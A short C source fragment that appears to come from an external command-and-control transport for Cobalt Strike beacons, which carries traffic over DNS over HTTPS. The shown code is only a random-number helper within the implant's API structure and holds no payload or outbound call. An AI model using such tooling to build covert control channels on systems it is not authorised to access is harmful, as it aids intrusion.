/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * RandomNumber32
 *
 * Purpose:
 *
 * Returns a random unsigned long integer.
 *
-*/
DEFINESEC(B) ULONG RandomNumber32( PBEACON_INSTANCE Ins )
{
	ULONG Seed = 0;

	Seed = Ins->api.GetTickCount();
	Seed = Ins->api.RtlRandomEx( &Seed );

	return Ins->api.RtlRandomEx( &Seed );
};
